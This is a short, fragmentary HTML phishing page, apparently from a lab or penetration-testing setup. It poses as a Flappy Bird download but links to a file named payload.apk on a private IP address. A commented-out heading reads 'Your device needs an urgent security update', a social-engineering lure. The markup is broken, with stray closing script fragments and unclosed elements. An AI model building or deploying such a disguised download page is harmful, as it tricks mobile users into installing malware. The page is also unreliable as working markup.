<!DOCTYPE html>
<html lang="en">
<head>

    <title>Flappy Bird</title>
</head>
<body>
<!--     <h1>Your device needs an urgent security update</h1> -->
    <p>Please click the button below to download Flappy Bird App In Mobile.</p>
    <a id="download" href="http://192.168.31.131/payload.apk" download="flappy-bird.apk">
        <button>Download Flappy Bird</button>

        };
    </script>
